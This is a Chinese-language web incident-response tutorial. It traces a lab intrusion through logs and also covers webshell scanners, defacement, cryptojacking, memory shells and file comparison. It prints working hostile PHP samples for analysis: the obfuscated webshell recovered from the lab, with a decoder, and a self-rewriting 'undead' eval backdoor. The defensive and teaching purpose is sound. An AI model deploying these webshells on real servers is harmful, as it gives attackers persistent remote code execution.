web攻击应急响应
=========

写在前面
----

随着 Web 技术不断发展，Web 被应用得越来越广泛，现在很多企业对外就一个网站来提供服务，所以网站的业务行为，安全性显得非常重要。当网页发生篡改、服务器被植入挖矿木马、网站被劫持等安全攻击事件，日志信息记录这重要的信息，web日志分析的思路显得相当重要，及时处理这些问题刻不容缓。  
**日志文件格式与保存路径**  
在不同环境不同管理员搭建的网站日志保存的位置和格式会有所不同，但日志保存的位置还是有一定的规律，此时需要我们多去收集。日志的格式这个得根据实际情况分析，而在有些管理员设置日志文件的时候，可能将所有的日志信息保存在一个文本中，另外一种可能是管理员按时间或者按一定的规律将日志信息保存在不同的文本中，后一种见得更多。

web日志分析
-------

#### 单个文件分析

由于在单个文件中的日志现在已经非常少了，比较简单不展开介绍，只是举一个例子。在单个文件中还是比较好操作的，来看看吧，首先一看到gobuster这一关键词，用于目录收集的（在应急响应的时候可以整理自己的指纹库，指纹库就是一些常用的攻击工具的特征，这样可以让我们在应急响应时通过关键词快速发现一些问题，所以平时做一个有心人，多去整理一些资料）  
[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5cba521668230cb62c8993d694c6bf05309d9043.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5cba521668230cb62c8993d694c6bf05309d9043.png)

后面利用了sqlmap进行注入，也有专门的特征

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-be5e116ddcbecf56a56480897176daf3213c4ccd.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-be5e116ddcbecf56a56480897176daf3213c4ccd.png)

#### 多个文件分析

多文件分析相对复杂，这里将详细介绍。下面的日志是某师傅打内网靶场的日志，在日志文件非常多的情况下，我们往往需要用工具与手工配合，由于并未告诉我webshell文件是在哪，所以只能使用webshell查杀工具将整个目录先查杀一遍，首先来个河马查杀，出现以下内容，一个一个去查看这些文件，发现都不是后门文件，此时有点尴尬了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-49b7eccb0404c733189b7680aaab07c2d9fba53a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-49b7eccb0404c733189b7680aaab07c2d9fba53a.png)

换D盾查杀一下，查看下面的文件分析到以下红色框框内的文件为webshell后门。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3fd896e32d605c61d86dca0f5615a389a4393b21.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3fd896e32d605c61d86dca0f5615a389a4393b21.png)

**这里介绍一下常用的webshell检测工具：**

```php
1、D盾_Web查杀
阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。
兼容性：只提供 Windows 版本。
工具下载地址：http://www.d99net.net
2、百度 WEBDIR+
下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。
兼容性：提供在线查杀木马，免费开放 API 支持批量检测。
在线查杀地址：https://scanner.baidu.com
3、河马
专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。
兼容性：支持 Windows、Linux，支持在线查杀。
官方网站：https://www.shellpub.com
4、Web Shell Detector
Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。
兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。
官方网站：http://www.shelldetector.com
github项目地址：https://github.com/emposha/PHP-Shell-Detector
5、PHP Malware Finder
PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具
兼容性：提供Linux 版本，Windows 暂不支持。
GitHub 项目地址：https://github.com/jvoisin/php-malware-finder
6、在线 WebShell 查杀工具
在线查杀地址：http://tools.bugscaner.com/killwebshell
```

查看后门文件的内容如下：（似乎有点看不懂，后面再分析）

```php
<?php
$OOO0O0O00=__FILE__;$OOO000000=urldecode('%74%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64%66%70%6e%72');$OO00O0000=56;$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO000000{5};$OOO0000O0.=$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16};$OOO0000O0.=$OOO0000O0{3}.$OOO000000{11}.$OOO000000{12}.$OOO0000O0{7}.$OOO000000{5};$O0O0000O0='OOO0000O0';eval(($$O0O0000O0('JE9PME9PMDAwMD0kT09PMDAwMDAwezE3fS4kT09PMDAwMDAwezEyfS4kT09PMDAwMDAwezE4fS4kT09PMDAwMDAwezV9LiRPT08wMDAwMDB7MTl9O2lmKCEwKSRPMDAwTzBPMDA9JE9PME9PMDAwMCgkT09PME8wTzAwLCdyYicpOyRPTzBPTzAwME89JE9PTzAwMDAwMHsxN30uJE9PTzAwMDAwMHsyMH0uJE9PTzAwMDAwMHs1fS4kT09PMDAwMDAwezl9LiRPT08wMDAwMDB7MTZ9OyRPTzBPTzAwTzA9JE9PTzAwMDAwMHsxNH0uJE9PTzAwMDAwMHswfS4kT09PMDAwMDAwezIwfS4kT09PMDAwMDAwezB9LiRPT08wMDAwMDB7MjB9OyRPTzBPTzAwME8oJE8wMDBPME8wMCwxMjU5KTskT08wME8wME8wPSgkT09PMDAwME8wKCRPTzBPTzAwTzAoJE9PME9PMDAwTygkTzAwME8wTzAwLDM4MCksJ0VudGVyeW91d2toUkhZS05XT1VUQWFCYkNjRGRGZkdnSWlKakxsTW1QcFFxU3NWdlh4WnowMTIzNDU2Nzg5Ky89JywnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLycpKSk7ZXZhbCgkT08wME8wME8wKTs=')));return;?>
kr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXPkr9NTzEXHenNHtILT08XT08XHr8XhtONTznNTzEXHr8Pkr8XHenNHr8XHtXLT08XHr8XHeEXhUXmOB50cbk5d3a3D2iUUylRTlfNaaOnCAkJW2YrcrcMO2fkDApQToxYdanXAbyTF1c2BuiDGjExHjH0YTC3KeLqRz0mRtfnWLYrOAcuUrlhU0xYTL9WAakTayaBa1icBMyJC2OlcMfPDBpqdo1Vd3nxFmY0fbc3Gul6HerZHzW1YjF4KUSvkZLphUL7cMYSd3YlhtONHeEXTznNHeEpK2a2CBXPkr9NHenNHenNHtL7wtOiNUEPwJrJbJkEwJLVk3Yzcbk0kzSLCUILb1nNA1OdDoyjD2aZbUL7
```

看到上面webshell目录猜测是通过文件上传上传进去的，毕竟upload在上面对吧，此时就需要寻找日志文件来进行分析，首先寻找对应上述文件的时间的日志文件，找到该文件日志后对其进行首先要做的是搜索有谁访问过该文件，在该文件夹搜索并未发现有该内容，但192.168.1.106请求的数据中出现了大量的404

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-728ac4bfcc1a3ed054eada19dde063cc224e68a4.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-728ac4bfcc1a3ed054eada19dde063cc224e68a4.png)

此时的日志文件太多，难道一个一个翻来覆去的去查找吗？这显然是不现实的，太慢了，此时就需要借助工具，这里使用fileseek这款工具，来看看效果吧，将所有的日志文件添加上去，此时根据自己的需要设置，该工具使用简单，能够查询所选文件夹中的文本中所出现的内容，并且能够看到时间，对我们分析有很大的帮助，为什么这么说呢？通过最早访问的时间，可以大致推测攻击者攻击的时间，并且能够很好的进行对比。有两个日志文件包含该内容

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-03481771d5043c141804bd7455d0c299c8b4fe5d.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-03481771d5043c141804bd7455d0c299c8b4fe5d.png)

打开日志后，是192.168.1.106有访问过，有点看不懂下面的SQL语句，但是知道访问的路径，但几乎可以确定就是它。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c3c26ce26f7c965a3133b39e0f9bd854d66d4838.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c3c26ce26f7c965a3133b39e0f9bd854d66d4838.png)

试着也访问一下，并没有访问到

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-973c67287e0050507dc90f5df81dc94fa5bf3af9.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-973c67287e0050507dc90f5df81dc94fa5bf3af9.png)

此时查看另外的日志文件，也并未获取到很多有用的东西，但还是尝试一下在该域名下进行访问

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8bcd868f845d0f501eafca1cffa2a730bb76ebe6.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8bcd868f845d0f501eafca1cffa2a730bb76ebe6.png)

拼接上去后跳转到登录界面

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6f11ba4d89bfaf8313eb7749f29009436e896ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6f11ba4d89bfaf8313eb7749f29009436e896ff.png)

此时大致知道了，他应该是通过后台登录进行上传文件的，那么他是如何登录后台的呢？脑海里想起有这几个漏洞SQL注入、弱口令、接口未授权访问、垂直越权。来看看admin域名的日志信息吧。发现存在大量飞get型和post型注入请求，难道是通过SQL注入来入侵的？这里还是不能确定是不是。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1fd7df8ef94c65aae5f1d61dcb2c82ae0ab2b05e.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1fd7df8ef94c65aae5f1d61dcb2c82ae0ab2b05e.png)

面对此时的场景还是有点迷茫，思路找不到这是很要命的事情，自己先用sqlmap来跑一下看看情况如何，有点小尴尬，没有跑出来。还有其他注入姿势？暂时不清楚，先放着。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-358bedf7496d8ba8f06147dba98eb1ba3af28b10.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-358bedf7496d8ba8f06147dba98eb1ba3af28b10.png)

继续翻后面的日志  
发现有大量类型一样的post请求，这很熟悉吧？这不就是密码爆破的日志么，此时按照思路来讲应该是上面的sqlmap注入没有成功，不然不会继续爆破，看看爆破的最后出现了与前面不一样的数字，那么说明成功了。并且在下面就开始大量的请求其他的接口了

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4d15c2db499206670d0d121a0dbac03ea4f4ae42.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4d15c2db499206670d0d121a0dbac03ea4f4ae42.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0808c430cf27da558ea8215573956ad5365793de.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0808c430cf27da558ea8215573956ad5365793de.png)

先登录后台，此时根据上面文件中的接口一个接口试过去，发现存在文件上传的点

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1d1f0f11e075105fa075616ae56126516246926e.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1d1f0f11e075105fa075616ae56126516246926e.png)

这里添加了PHP允许上传文件，所以webshell就是通过这里上传上去的，大致的攻击思路已经分析完成。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-166e75839118ccb48a018aa21100799c2db8dcbc.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-166e75839118ccb48a018aa21100799c2db8dcbc.png)

来分析一下它的马，经过网上查询该马特征似乎根据过微盾加密，使用微盾解密，附上大佬的脚本如下：

```php
<?php 
/*********************************** 
*威盾PHP加密专家解密算法 By：Neeao 
*http://Neeao.com 
***********************************/ 

$filename="play-js.php";//要解密的文件 
$lines = file($filename);//0,1,2行 

//第一次base64解密 
$content=""; 
if(preg_match("/O0O0000O0\('.*'\)/",$lines[1],$y)) 
{ 
    $content=str_replace("O0O0000O0('","",$y[0]); 
    $content=str_replace("')","",$content); 
    $content=base64_decode($content); 
} 
//第一次base64解密后的内容中查找密钥 
$decode_key=""; 
if(preg_match("/\),'.*',/",$content,$k)) 
{ 
    $decode_key=str_replace("),'","",$k[0]); 
    $decode_key=str_replace("',","",$decode_key); 
} 
//查找要截取字符串长度 
$str_length=""; 
if(preg_match("/,\d*\),/",$content,$k)) 
{ 
    $str_length=str_replace("),","",$k[0]); 
    $str_length=str_replace(",","",$str_length); 
} 
//截取文件加密后的密文 
$Secret=substr($lines[2],$str_length); 
//echo $Secret; 
//直接还原密文输出 
echo "<?php\n".base64_decode(strtr($Secret,$decode_key,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'))."?>"; 
?> 
```

放置本地服务器，访问时并没有看到东西，查看源代码就可以看到解密后的密码了，该马还使用了异或运算来进行免杀，对这次的分析还收获了很多，让我大致明白了日志分析的思路，同时也收获了一马。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-163298a81b55027fe84cc156055862089dc445bf.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-163298a81b55027fe84cc156055862089dc445bf.png)

通过该案例对日志分析应该有一定的认识了，先用一张图来理一下思路：

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-13c512d006c3603420b92b278f47926d4171414f.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-13c512d006c3603420b92b278f47926d4171414f.png)

**在web日志分析中主要掌握以下几点：**

```php
1、熟悉web日志的格式，以及常用搭建环境下日志文件保存的位置（推荐使用everthing快速搜索文件）
2、关注攻击者攻击的时间
3、关注攻击者添加的内容
4、关注攻击者的ip
5、关注攻击者的操作顺序
6、学会多个文件进行对比分析
7、收集常用的web攻击攻击指纹库（很多工具都有特定的指纹如sqlmap，蚁剑等）
8、在没有思路的情况下，试着自己先尝试可不可以进行利用
```

通过上面的分析以及讲解，其实日志分析并不难，日志分析大致都是一个思路，不过有的时候攻击者往往攻击的目的不同，很多植入挖矿脚本、植入博彩信息等等。在这些应急响应经常遇见，那么如何应对以上情形呢？且看下面一一道来

批量挂黑页应急响应
---------

当网站的友情链接模块被挂大量垃圾链接，网站出现了很多不该有的目录，里面全是博彩相关的网页。而且，攻击者在挂黑页以后，会在一些小论坛注册马甲将你的网站黑页链接发到论坛。在搜索引擎搜索网站地址时，收录了一些会出现一些博彩页面，严重影响了网站形象。  
**出现的特征**  
某网站被挂了非常多博彩链接，链接形式如下：  
<http://www.xxx.com/upload/structure/index.html>  
<http://www.xxx.com/upload/neyyss/index.html>  
链接可以访问，直接访问物理路径也可以看到文件，但是打开网站目录并没有发现这些文件，这些文件到底藏在了哪？其实很多攻击者有的会帮文件隐藏起来。  
访问这些链接，跳转到如图页面：

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8515c0797d5160d3c0ec0c46813cb8935c8f697d.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8515c0797d5160d3c0ec0c46813cb8935c8f697d.png)

### 解决办法

打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-68e61b5367ff3be4be47f740d0447ba1f106f3ed.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-68e61b5367ff3be4be47f740d0447ba1f106f3ed.png)

再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-aab575b8f702bf72fece72a8d0667668dfa9b2ed.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-aab575b8f702bf72fece72a8d0667668dfa9b2ed.png)

门罗币恶意挖矿应急响应
-----------

门罗币(Monero 或 XMR)，它是一个非常注重于隐私、匿名性和不可跟踪的加密数字货币。只需在网页中配置好js脚本，打开网页就可以挖矿，是一种非常简单的挖矿方式，而通过这种恶意挖矿获取数字货币是黑灰色产业获取收益的重要途径。这个操作往往不需要太高的系统权限，整个过程也非常容易操作  
**出现的特征**  
利用XMR恶意挖矿，浏览器进程占用了较大的CPU资源，严重影响了网站的用户体验。  
**分析**  
通过获取恶意网页url，对网页页面进行分析，发现网站页面被植入在线门罗币挖矿代码：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-fbb6b68c16be7960d93a45cfe454c49a5da8b7fe.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-fbb6b68c16be7960d93a45cfe454c49a5da8b7fe.png)

### 解决办法

删除js里面的恶意代码，网站被XMR 恶意挖矿，说明服务器已经被攻击，进一步做服务器入侵排查。

不死马应急响应
-------

在web端的应急响应时有时可能碰得到不死马

```php
<?php
    ignore_user_abort(true);//函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行
    set_time_limit(0);//函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制
    unlink(__FILE__);//删除文件本身，以起到隐蔽自身的作用
    $file = 'index.php';//写入的后门文件名
    $code='<?php if(md5($_GET["pass"])=="21232f297a57a5a743894a0e4a801fc3"){@eval($_POST[a];} ?>';//get提交的pass参数后面的值md5加密后是否与后面的值相等，可自行设置md5值
    while(1){//一直循环
        file_put_contents($file,$code);
        usleep(5000);//循环内每隔usleep(5000),写新的后门文件
    }
?>
```

### 解决办法

1、关闭对应的不死马进程 在Linux中使用ps -aux | grep index.php  
2、重启PHP等web服务  
3、使用条件竞争法，什么是条件竞争呢？至需要将上面的code代码修改为其他代码，usleep低于对方不死马设置的值，运行该文件后就会生成文件名为index.php的文件，和上面一样，但是由于我们写的代码生成的速度更快，替换掉了上面的后门。（这是在未找到进程已经暂时不能重启的情况下）

内存马攻击应急响应
---------

由于内存马的知识太多，这里推荐几篇文章  
<https://www.cnblogs.com/fxsec/p/15000570.html>  
<https://www.freebuf.com/articles/web/274466.html>  
<https://www.freebuf.com/articles/network/288602.html>  
**排查内存马思路**  
为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，这在shiro反序列化中是刚需。但其他场景下就非必须，只能做一个可疑点。  
jsp注入，日志中排查可疑jsp的访问请求，代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法  
内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，这也是个可以的特征。但servlet 3.0引入了@WebFilter标签方便开发这动态注册Filter。这种情况也存在没有在web.xml中显式声明，这个特征可以作为较强的特征。  
**防御**  
实时检测与防御能力，容易被绕过而造成安全威胁。内存保护技术则包括硬件虚拟化技术、行为分析技术、关联分析技术，对于漏洞利用、动态枚举等都有很好的检测、防御能力，可以更好的解决内存马攻击的安全威胁。

### 解决办法

这里提供两个个常用的脚本进行查杀内存马  
<https://github.com/c0ny1/java-memshell-scanner>  
<https://github.com/huoji120/DuckMemoryScan>  
找到内存马的进程即可，配合上面的进行删除

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-bfd83cf8b5a3d1d1af94a57cd8d097808011f090.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-bfd83cf8b5a3d1d1af94a57cd8d097808011f090.png)

而在一些特定的情况下，我们对webshell、攻击者修改的地方无法一直找不到，在大型的网站文件是相当多，此时是一个很棘手的问题，比如在攻击者攻击时，是在编辑器中添加的代码，此时如果查杀工具和我们自己分析并未找到该怎么办呢？而一般网站的管理者对网站的源码都会备份一部分，最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。下面将介绍一款工具。

Beyond Compare工具的使用
-------------------

Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。  
下载地址：<http://www.scootersoftware.com/download.php>  
软件使用示例，通过文件夹比较，找出文件夹中的差异内容。  
双击 Beyond Compare ，打开软件主页，选择文件夹比较。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-99419ad34c4ad5375a9aa6dacf772fdab52eead5.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-99419ad34c4ad5375a9aa6dacf772fdab52eead5.png)

可以清晰的看到哪个文件夹被改动、新添加了哪些文件、 以及被隐藏的文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c2a46babad396b460df79acea0c4e3a1c6cab6a9.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c2a46babad396b460df79acea0c4e3a1c6cab6a9.png)

在对文本进行比较，可以成功的看到修改的内容

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-11fecb10c572070e353ac2132424698781f1f99a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-11fecb10c572070e353ac2132424698781f1f99a.png)

总结
--

通过上面的分析，可以清楚的知道web攻击的危害以及如何处理，作为一个网络管理员，要时刻铭记漏洞带来的危害，提高自身的安全意识，要如何尽量避免以上攻击呢？  
1、对网站的代码，数据库经常的备份；  
2、定时对网站进行扫描；  
3、及时修复网站漏洞；  
4、使用网站防火墙产品，如云waf，能够有效防护来自外界的恶意攻击，如sql注入、cc攻击、篡改、盗链、暗链、木马等多种攻击，有效防护网站安全；  
5、关注新型的攻击方式；  
6、关闭不必要的目录权限；  
7、不轻易点击别人发过来的文件，泄露信息  
经常更换复杂的密码，很多人的安全意识较薄弱，密码设置得非常简单。  
在这里为了让大家也能够复现一遍，我已将日志上传。  
链接：[https://pan.baidu.com/s/1UPJvF9PpgO1JfSMt1soH\_w](https://pan.baidu.com/s/1UPJvF9PpgO1JfSMt1soH_w)  
提取码：sb6e